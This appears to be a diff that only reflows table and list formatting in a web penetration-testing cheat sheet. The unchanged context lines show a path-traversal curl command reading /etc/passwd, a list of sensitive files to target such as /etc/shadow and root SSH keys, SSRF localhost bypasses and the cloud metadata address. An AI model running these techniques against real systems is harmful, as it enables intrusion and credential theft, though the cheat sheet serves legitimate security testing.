@@ -41,7 +41,7 @@ feroxbuster --url $URL -w /usr/share/seclists/Discovery/Web-Content/directory-li
 ### Alternative Wordlists
 
 | Count  | Path                                                                     |
-|--------|--------------------------------------------------------------------------|
+| ------ | ------------------------------------------------------------------------ |
 | 137771 | `/usr/share/seclists/Discovery/Web-Content/combined_directories.txt`     |
 | 127383 | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`   |
 | 22056  | `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`           |
@@ -55,14 +55,14 @@ feroxbuster --url $URL -w /usr/share/seclists/Discovery/Web-Content/directory-li
 
 ### Extensions
 
-| no | File Type    | Uses                                        |
-|----|--------------|---------------------------------------------|
-| 1  | `.yaml,.yml` | Config files especially on flat cms systems |
+| no  | File Type    | Uses                                        |
+| --- | ------------ | ------------------------------------------- |
+| 1   | `.yaml,.yml` | Config files especially on flat cms systems |
 
 ### API Enumeration
 
 | Count | Path                                                                  |
-|-------|-----------------------------------------------------------------------|
+| ----- | --------------------------------------------------------------------- |
 | 268   | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt`     |
 | 3132  | `/usr/share/seclists/Discovery/Web-Content/api/objects.txt`           |
 | 12334 | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt` |
@@ -113,7 +113,7 @@ nmap --script http-webdav-scan -p80 $IP
   ```bash
   curl --path-as-is $URL:3000/public/plugins/welcome/../../../../../../../../etc/passwd
   ```
-    * `--path-as-is` preserves traversal attempts
+  * `--path-as-is` preserves traversal attempts
 
 - File Upload:
   ```bash
@@ -208,10 +208,10 @@ curl -v -I http://target
   get_file_contentes
   ```
 - Common files:
-    * `/etc/issue`, `/etc/profile`, `/proc/version`, `/etc/passwd`,
-      `/etc/shadow`, `/root/.bash_history`, `/var/log/dmessage`,
-      `/var/mail/root`, `/root/.ssh/id_rsa`, `/var/log/apache2/access.log`,
-      `c:\boot.ini`
+  * `/etc/issue`, `/etc/profile`, `/proc/version`, `/etc/passwd`,
+    `/etc/shadow`, `/root/.bash_history`, `/var/log/dmessage`,
+    `/var/mail/root`, `/root/.ssh/id_rsa`, `/var/log/apache2/access.log`,
+    `c:\boot.ini`
 
 ### Local File Inclusion
 
@@ -240,8 +240,8 @@ curl -v -I http://target
 - External request
   capture: [requestbin.com](http://requestbin.com) | [webhook.site](https://webhook.site)
 - Path manipulation:
-    * `../../` to change API path
-    * `&x=` to nullify rest of line
+  * `../../` to change API path
+  * `&x=` to nullify rest of line
 - Localhost bypasses:
   ```bash
   http://0
@@ -254,9 +254,9 @@ curl -v -I http://target
   http://127.0.0.1.nip.ip
   ```
 - Cloud metadata:
-    * `169.254.169.254`
+  * `169.254.169.254`
 - DNS-based bypass:
-    * `http://website.com.whirley.com`
+  * `http://website.com.whirley.com`
 
 ---
 
